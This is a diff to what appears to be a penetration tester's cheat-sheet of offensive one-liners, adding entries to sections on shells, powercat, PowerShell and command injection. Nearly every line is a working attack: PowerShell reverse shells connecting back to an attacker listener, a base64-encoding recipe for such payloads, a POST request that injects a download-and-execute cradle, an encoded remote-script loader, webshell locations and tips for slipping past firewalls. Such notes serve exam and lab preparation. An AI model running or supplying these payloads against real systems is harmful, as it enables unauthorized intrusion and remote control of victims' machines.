@@ -1,9 +1,10 @@
 ^Shell notes:If payload fails, try encoding the payload
 ^Shell notes:PHP injection/ready webshells located in /usr/share/webshells/
-^Shell notes:ASPX webshell: cmdasp.aspx
+^Shell notes:ASPX webshell: cmdasp.aspx # see /usr/share/webshell/aspx
 ^Shell notes:PHP webshells: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
 ^Shell notes: https://github.com/int0x33/nc.exe/blob/master/nc64.exe # Netcat for Windows
 ^Shell notes: https://gist.github.com/dejisec # useful msfvenom
+^Shell notes: https://gist.githubusercontent.com/qtc-de/19dfc9018685fce1ba2092c8e2382a79/raw/6d4df39b991b6fe54c606eee45483b17cdd09c4c/aspx-reverse-shell.aspx # aspx reverse shell
 ^Shell notes:Use ports like 443, 53, or 80 as LPORT to bypass firewalls. When encountering timeouts, try common ports: 80, 443, 53 (UDP/TCP), 21, 22
 ^Shell notes:Revshells.com has payload generators for all languages
 ^Shell notes:Always try to upgrade to full TTY after getting reverse shell
@@ -118,6 +119,7 @@ powercat:powercat -c <kali> -p <kaliPort> -e powershell -ssl # Reverse shell ove
 powercat:powercat -g -c <kali> -p <kaliPort> -e powershell # Generate standalone payload; kali-machine
 powercat:powercat -ge -c <kali> -p <kaliPort> -e powershell # Generate encoded payload; kali-machine
 
+powershell:echo -n '$client = New-Object System.Net.Sockets.TCPClient("<kali>",<kaliPort>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0 #generate UTF-16LE Base64-encoded PowerShell reverse shell payload for use with powershell -enc; kali-machine
 powershell:powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<kali>',<kaliPort>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))){$d=([Text.Encoding]::ASCII.GetString($b,0,$i));$o=iex $d 2>&1|Out-String;$w=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($w,0,$w.Length);$s.Flush()}" #interactive PowerShell reverse shell; target-machine
 powershell:powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<kali>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" # PowerShell reverse shell; target-machine
 powershell:powershell -e <base64> # Execute base64 encoded PowerShell; target-machine
@@ -127,7 +129,8 @@ powershell:powershell -EncodedCommand ([Convert]::ToBase64String([Text.Encoding]
 PowerShell Reverse Shell via HTTP POST:curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<kali>:<kaliPort>/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:<port>/archive # send malicious POST request to trigger PowerShell download cradle and execute reverse shell to Kali listener; kali-machine
 
 Bypassing web applications (Command injection):'$client = New-Object System.Net.Sockets.TCPClient("<kali>",4444);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while($true){$command = $reader.ReadLine();if($command -eq "exit"){break};$output = (Invoke-Expression $command 2>&1 | Out-String);$writer.WriteLine($output);$writer.Flush()};$client.Close()' | Out-File -Encoding ASCII shell.ps1 # create PowerShell reverse shell script and save as shell.ps1; kali-machine
-Bypassing web applications (Command injection):nc -lvnp 4444 # Start listener at TCP 4444
+Bypassing web applications (Command injection):nc -lvnp 4444 # Start listener at TCP 4444; kali-machine
+Bypassing web applications (Command injection):python3 -m http.server 80 # Start simple http server at Port 80 for shell.ps1; kali-machine
 Bypassing web applications (Command injection):powershell -EncodedCommand ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')\""))) # download and execute remote PowerShell script via Base64-encoded command; target-machine
 
 ^RevShells:https://www.revshells.com/ # Online reverse shell generator; kali-machine
